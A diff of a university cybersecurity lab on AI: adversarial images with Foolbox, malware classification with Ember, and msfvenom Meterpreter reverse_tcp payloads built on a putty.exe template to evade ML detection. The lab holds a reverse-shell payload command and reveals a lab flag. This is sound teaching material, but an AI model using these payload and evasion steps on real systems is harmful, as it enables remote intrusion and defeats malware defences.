@@ -1,14 +1,14 @@
 # Lab 10: AI
 
-Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to  these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain. 
+Artificial Intelligence is a collection of technologies that allows computers to simulate human intelligence. Its applicability in cybersecurity involves all aspects of AI, including natural language processing, speech recognition, expert systems, robotics and vision. Fundamental to these types of AI is machine learning, a technology that uses an approach to learning that tries and mimics the way nerve cells work in the brain.
 
- One area of active research in machine learning is the use of adversarial images. This is where slight changes in the image causes machine learning systems to incorrectly classify objects within the image. So for example, a panda is wrongly recognised as a gibbon. The changes to the image can be imperceptible to a human and so this type of attack could be used to alter a radiological image and change a negative diagnosis of cancer to a positive one in a system that is automatically screening for cancer. 
+One area of active research in machine learning is the use of adversarial images. This is where slight changes in the image causes machine learning systems to incorrectly classify objects within the image. So for example, a panda is wrongly recognised as a gibbon. The changes to the image can be imperceptible to a human and so this type of attack could be used to alter a radiological image and change a negative diagnosis of cancer to a positive one in a system that is automatically screening for cancer.
 
-Adversarial attacks could become increasingly common as we come to rely on machine learning systems to automate processes and decisions. This has made the field of research into defences against this type of attack important. 
+Adversarial attacks could become increasingly common as we come to rely on machine learning systems to automate processes and decisions. This has made the field of research into defences against this type of attack important.
 
-In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach. 
+In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach.
 
-To see how this works, we can use a program that uses what is called a non-targetted black box approach to adversarial images. 
+To see how this works, we can use a program that uses what is called a non-targetted black box approach to adversarial images.
 
 Start the docker container as follows:
 
@@ -24,14 +24,13 @@ docker run -v /projects/share:/opt/share -it cybernemosyne/cits1003:ai
 Tensorflow won't work on ARM and so you will have to
  skip this bit - the flag is weimaraner
 
-
 ```
 {% endtab %}
 {% endtabs %}
 
 The -v flag will allow you to share a local directory with the container which we are going to use to get image files. So use a local directory with nothing in it.
 
-Once on the docker container, go to the directory /opt/adversarial/share. From there, run the exploit.py program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes for a toolkit called Foolbox \([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)\). 
+Once on the docker container, go to the directory /opt/adversarial/share. From there, run the exploit.py program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes for a toolkit called Foolbox ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).
 
 To run the script we do so as follows:
 
@@ -58,7 +57,7 @@ Saving Epsilon = 0.150
 Processing image: prediction: W******* confidence: 16.211819648742676
 ```
 
-This takes the initial image of lab\_og.jpg and then creates different versions of the image with the perturbations added. The script tests these images against the neural network and very quickly stops recognising a Labrador and starts recognising other dog types such as the Saluki and Weimaraner, although note that the levels of confidence in that result are very low ~ 16%.
+This takes the initial image of lab\_og.jpg and then creates different versions of the image with the perturbations added. The script tests these images against the neural network and very quickly stops recognising a Labrador and starts recognising other dog types such as the Saluki and Weimaraner, although note that the levels of confidence in that result are very low \~ 16%.
 
 After running the program, you should have some files:
 
@@ -73,7 +72,7 @@ drwxr-xr-x 1 root root   4096 Jul 11 12:35  ..
 -rw-r--r-- 1 root root 134549 Jul 11 12:39  Input.jpg
 ```
 
-Copy these files to the shared folder with your machine: /opt/share 
+Copy these files to the shared folder with your machine: /opt/share
 
 {% hint style="danger" %}
 Note the Wolfram site only works intermittently - it isn't reliable. If you can't get it to work, don't worry - just use the predictions that the program exploit.py printed out
@@ -81,17 +80,13 @@ Note the Wolfram site only works intermittently - it isn't reliable. If you can'
 
 Back on your own machine, these files should be in the directory you specified to share with the docker container. We are now going to test these out on an image recognition program run by Wolfram which is here [https://www.imageidentify.com](https://www.imageidentify.com)
 
-Load the first image, Input.jpg, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with Epsilon = 0.010.jpg and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image which has had the most perturbations applied to it. 
+Load the first image, Input.jpg, into the site and verify that it is correctly recognised. Then try with each of the other adversarial images starting with Epsilon = 0.010.jpg and going up. If the site errors out, wait a bit and then try again, it seems to not like images being loaded too quickly. Eventually, it should fail to recognise the last image which has had the most perturbations applied to it.
 
 ### Question 1. Enter the wrong dog
 
 **Flag: Enter the name of the dog type that Wolfram or exploit.py recognises when the "Epsilon = 0.150.jpg" file is uploaded.**
 
 {% tabs %}
-{% tab title="" %}
-
-{% endtab %}
-
 {% tab title="Hint" %}
 If Wolfram isn't working for you, it was the same prediction as the exploit script gave!
 {% endtab %}
@@ -103,19 +98,19 @@ Try the same attack but this time using another picture - one of a bear:
 
 ![](../.gitbook/assets/bear.jpg)
 
-You can right click on this and save it to your share folder and then run the program again. 
+You can right click on this and save it to your share folder and then run the program again.
 
 Try with your own images - they need to be the appropriate size of 700px wide so scale them down by resizing in photo editing software if they are larger.
 
 ## Malware recognition with Ember
 
-Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings \(as we saw when we used Yara to identify malware\). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.
+Detecting malware relies on a static analysis of features such as the hash of the file and its use of strings (as we saw when we used Yara to identify malware). This is fine if you encounter malware that is something you have in a database of malware samples. Machine learning however tries to identify new malware by analysing the features and using a model that has been trained on millions of previous samples to be able to answer the question of whether the program is malware or not, rather than identifying the specific type of malware.
 
-The Elastic Malware Benchmark for Empowering Researchers \(Ember\) \([https://github.com/elastic/ember](https://github.com/elastic/ember)\) is a neural network that uses features extracted from binary files to train a model that can distinguish malware from regular Windows' programs. 
+The Elastic Malware Benchmark for Empowering Researchers (Ember) ([https://github.com/elastic/ember](https://github.com/elastic/ember)) is a neural network that uses features extracted from binary files to train a model that can distinguish malware from regular Windows' programs.
 
-To do this, Ember uses a framework called LIEF that will analyse Windows \(and other platforms\) binaries \([https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)\). The data that LIEF produces is then uses a "fingerprint" of the binary and can be used to train the model. 
+To do this, Ember uses a framework called LIEF that will analyse Windows (and other platforms) binaries ([https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)). The data that LIEF produces is then uses a "fingerprint" of the binary and can be used to train the model.
 
-To test the model cd on the same docker container to the directory /opt/ember. The model has been pre-trained and so you don't need to do that, although if you are interested, you can \(look at the GitHub page\).
+To test the model cd on the same docker container to the directory /opt/ember. The model has been pre-trained and so you don't need to do that, although if you are interested, you can (look at the GitHub page).
 
 To test the malware, we can use the following command:
 
@@ -135,7 +130,7 @@ The script classify\_binary.py takes the trained model as an argument and the bi
 This \*is\* real malware - do not download to your PC or try and execute
 {% endhint %}
 
-The malware is actually Emotet, which is a banking trojan. 
+The malware is actually Emotet, which is a banking trojan.
 
 We can now try with a normal Windows program git.exe
 
@@ -155,7 +150,7 @@ $$
 1.7*10^{-7}
 $$
 
- In other words, a practically 0 score for it being malware. 
+In other words, a practically 0 score for it being malware.
 
 ### Question 2. It was malware, probably...
 
@@ -163,9 +158,9 @@ $$
 
 ## Evading the classification Msfvenom and Meterpreter
 
-Msfvenom is a utility that comes with what is called an exploitation framework called Metasploit. Metasploit is a sophisticated toolset that is used by penetration testers \(and hackers\) to explore vulnerabilities and exploit them. Msfvenom can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a Meterpreter shell and normally this is recognised as malware by anti-malware software. 
+Msfvenom is a utility that comes with what is called an exploitation framework called Metasploit. Metasploit is a sophisticated toolset that is used by penetration testers (and hackers) to explore vulnerabilities and exploit them. Msfvenom can generate various payloads that when run on a target machine, will create remote access to that machine for attackers. One of these payloads is called a Meterpreter shell and normally this is recognised as malware by anti-malware software.
 
-Msfvenom comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially  machine learning classifiers. 
+Msfvenom comes with a variety of evasion techniques to avoid detection but most are easily detected by anti-malware software. However, there exists one approach that does fool anti-malware, especially machine learning classifiers.
 
 To get started, we are going to run Metasploit, and to do this we will run a Docker container in a separate terminal/cmd window as follows:
 
@@ -179,7 +174,6 @@ docker run -v /projects/share:/opt/share -it cybernemosyne/cits1003:metasploit
 {% tab title="Apple Silicon" %}
 ```
 docker run -v $(pwd)/share:/opt/share -it cybernemosyne/cits1003:metasploit-x
-
 ```
 {% endtab %}
 {% endtabs %}
@@ -194,7 +188,7 @@ msfconsole
 
 and answer yes to the following question and no to the second.
 
-After doing that, you should see something like this \(the actual graphic changes each time\):
+After doing that, you should see something like this (the actual graphic changes each time):
 
 ```bash
 [!] The following modules could not be loaded!..\
@@ -247,7 +241,7 @@ LHOST => 172.17.0.3
 msf6 > 
 ```
 
-The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :\) \).
+The graphic changes each time you load it so don't worry if your version doesn't show Missile Command - and in case you were wondering - Missile Command was a very popular video game back in the 1980's :) ).
 
 We are going to need a file called putty.exe that we are going to use as a template for one of the Meterpreter versions and so download it now to the directory you have shared with the container:
 
@@ -304,11 +298,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 -f exe
 
 However, when you classify this one, you will see that it is still recognised as malware.
 
-It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than whith images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that. 
+It is important to note that machine learning evasion by masquerading as a normal binary is not an adversarial technique. You have simply overwhelmed the classifier with enough features of normal binaries that it tips it into classifying it as such. Adversarial techniques in malware are more difficult than whith images because you are more limited in what you can change. You still want a binary that works after your changes and so randomly changing bits of the file can easily stop it from doing that.
 
 ### Question 3. Who is Metasploit?
 
 **Flag: Type in whoami in the msf console and type in the username as the flag**
 
-If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there. 
-
+If you are interested, upload the meterpreter versions you created to VirusTotal and see what they are classified as there.
